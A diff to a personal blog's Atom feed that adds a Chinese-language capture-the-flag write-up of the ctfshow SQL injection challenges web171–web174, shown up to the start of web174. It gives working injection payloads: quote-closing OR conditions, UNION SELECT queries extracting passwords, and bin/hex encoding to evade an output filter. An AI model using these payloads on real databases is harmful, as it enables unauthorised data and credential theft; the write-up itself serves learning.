@@ -6,7 +6,7 @@
   <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
   
   <link href="https://ke1nys.github.io/"/>
-  <updated>2022-12-26T08:16:32.183Z</updated>
+  <updated>2022-12-26T14:30:29.536Z</updated>
   <id>https://ke1nys.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ctfshow-sql注入 刷题记录</title>
+    <link href="https://ke1nys.github.io/posts/b77a4eaf.html"/>
+    <id>https://ke1nys.github.io/posts/b77a4eaf.html</id>
+    <published>2022-12-26T08:28:29.000Z</published>
+    <updated>2022-12-26T14:30:29.536Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>源码</p><p><img src="../images/image-20221226192746294.png" alt="image-20221226192746294"></p><p>给了一个sql语句，那么我们就可以通过这sql语句来进行判断，那么我们可以自己新建一个数据库来测试。</p><p>就是利用phpstudy和navicat    （网上有教程，可以去拿来学习学习）</p><p><img src="../images/image-20221226193154082.png" alt="image-20221226193154082"></p><p>新建了一个和题目差不多的user表，然后就可进行测试。</p><p><img src="../images/image-20221226193548945.png" alt="image-20221226193548945"></p><p>通过这几个简单的测试，发现了就是虽然username不等于flag的情况下，可以利用id，就令前面的id=xx不成立的情况下，就可以用到后面的id了，那么我们就得以后面的id为突破口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;xxx     &#x27;&#x27;是为了闭合sql语句，否则无法执行</span><br></pre></td></tr></table></figure><p><strong>解法</strong></p><p>这道题的解法是看到只能查到id=24,我们就怀疑会不会藏在后面，我们就可以一个一个的试出来。</p><p><img src="../images/image-20221226193930975.png" alt="image-20221226193930975"></p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>源码</p><p><img src="../images/image-20221226203357870.png" alt="image-20221226203357870"></p><p><img src="../images/image-20221226203412925.png" alt="image-20221226203412925"></p><p>这道题直接用上一道题的解法，这道题就解不了了那么可以换别的解法，就是union联合注入。</p><p>就是可以本地试一下，如果成功了话，就可以拿去题目试一下</p><p><img src="../images/image-20221226204544643.png" alt="image-20221226204544643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from user where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>这里查询列的数量要和题目给的语句中列的数量一样</p><p>这句话成功执行了，那么我们就可以拿去题目试一下，发现也可以成功执行，就拿到flag了。</p><p><img src="../images/image-20221226204645887.png" alt="image-20221226204645887"></p><p><strong>也可以利用模糊查询，但是只能本地通过，题目不能通过。</strong></p><p><img src="../images/image-20221226205245342.png" alt="image-20221226205245342"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or username like &#x27;%f%</span><br></pre></td></tr></table></figure><p><strong>补充点知识</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql  中的点是 &#x27; . &#x27;  可以这样用，再有多个数据库的情况下， </span><br><span class="line">数据库名.xxxxx    例如这道题就可以这样用  ctfshow_user2.username   ctfshow_user2.id</span><br><span class="line">ctfshow_user2.password</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也可以把数据库设做别的名字。   利用的是   as  这个单词</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select b.id,b.password from user as b where b.username=&#x27;flag</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from ctfshow_user2 where username=&#x27;flag</span><br></pre></td></tr></table></figure><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>源码</p><p><img src="../images/image-20221226210521949.png" alt="image-20221226210521949"></p><p>这道题是结果返回的过程中不能出现flag,那么我们就得想办法把flag给绕过，那么我们就可以通过转换进制来绕过。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,bin(username),password from ctfshow_user3 where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>也可以换成hex   —&gt;16进制。</p><p><img src="../images/image-20221226211348202.png" alt="image-20221226211348202"></p><p>那么就可以成功拿到flag了。</p><p>最好是本地测试通过后在搬到题目上</p><p><img src="../images/image-20221226211450157.png" alt="image-20221226211450157"></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>源码</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;web171&quot;&gt;&lt;a href=&quot;#web171&quot; class=&quot;headerlink&quot; title=&quot;web171&quot;&gt;&lt;/a&gt;web171&lt;/h2&gt;&lt;p&gt;源码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../images/image-20221226192746294.</summary>
+      
+    
+    
+    
+    
+    <category term="ctfshow sql注入 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-sql%E6%B3%A8%E5%85%A5-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
+    
+  </entry>
   
   <entry>
     <title>ctfshow 文件上传 刷题记录</title>
